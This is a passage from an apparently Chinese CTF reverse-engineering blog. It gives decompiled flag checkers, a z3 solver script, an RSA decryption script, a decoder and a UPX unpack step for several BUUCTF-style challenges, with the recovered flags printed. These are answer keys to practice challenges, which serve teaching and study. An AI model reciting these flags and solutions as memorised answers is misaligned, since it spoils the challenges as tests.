number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变成数学问题了，变成数学问题就简单的多了。</p><p>看起来应该是<code>a1</code>这个字符数组里面的内容就是我们要找的flag了，并且长度也是32位，符合一般的flag的32位的md5的特征，所以直接解一下方程即可，编写<code>z3-solver</code>脚本如下(注意要先下载<code>z3-solver</code>库)。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Int<span class="token punctuation">(</span><span class="token string">'a1['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># z3声名整数型的符号变量</span><span class="token comment"># add为添加至z3约束求解器中的内容</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">)</span><span class="token comment"># z3约束求解</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>a <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>temp<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;e65421110ba03099a1c039337&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始没发现a1[6]并没有给，看wp知道a1[6]的值为<code>1</code>，故flag为</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;e165421110ba03099a1c039337&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h3><p><strong>TAG:RSA、ELF文件</strong></p><p>没壳，打开一看不就是RSA吗，看到65537就感觉不简单，简单解下RSA即可</p><p><img src="/2021/05/28/CTF/image-20210607165616788.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn <span class="token operator">=</span> <span class="token number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>c <span class="token operator">=</span> <span class="token number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">282164587459512124844245113950593348271</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'suctf&#123;Pwn_@_hundred_years&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p><strong>TAG:一般题目</strong></p><p>给出了两个附件，一个是txt文件，另一个是一般的ELF的64位文件，txt文件给出的应该是程序的输出，将程序拖入64位ida分析，找到关键代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2Ch]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">19</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">*</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般的差不多算是加密的东西，直接得(太签到了)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">816</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1536</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">6144</span><span class="token punctuation">,</span> <span class="token number">984</span><span class="token punctuation">,</span> <span class="token number">51200</span><span class="token punctuation">,</span> <span class="token number">570</span><span class="token punctuation">,</span> <span class="token number">92160</span><span class="token punctuation">,</span> <span class="token number">1200</span><span class="token punctuation">,</span> <span class="token number">565248</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">1474560</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">6291456</span><span class="token punctuation">,</span> <span class="token number">1782</span><span class="token punctuation">,</span> <span class="token number">65536000</span><span class="token punctuation">]</span><span class="token comment"># 上面首位加上0作为填充位</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> i        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> i        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ctf2020&#123;d9-dE6-20c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p><strong>TAG:UPX脱壳</strong></p><p>打开没有后缀名，misc做习惯了之后总是先把这种比较小得没有后缀名的文件先使用记事本打开看看有什么东西。注意到UPX，直接脱壳</p><pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\attachment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210610004111012.png" alt></p><p><img src="/2021/05/28/CTF/image-20210610005411954.png" alt></p><p>但是这个似乎不是64位的可执行文件，而是i386。。应该是32位，ida32打开之后看函数太多先查找字符串</p><p><img src="/2021/05/28/CTF/image-20210610010158519.png" alt></p><p>我踏马直接大雾，这是什么牛马，这为啥就直接就在这，这是签到吗，为啥还叫level2啊。。。想了许久，也许比赛本来是面向新生的，新生可能对upx的脱壳方法不太了解罢。</p><pre class="line-numbers language-none"><code class="language-none">wctf2020&#123;Just_upx_-d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><p><strong>TAG:</strong></p><p><img src="/2021/05/28/CTF/image-20210610010527059.png" alt></p><p>关键<code>mian</code>函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-68h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h]</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>  __int64 v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-30h] BYREF</span>  v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let us play a game?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you have six chances to input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Come on!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token 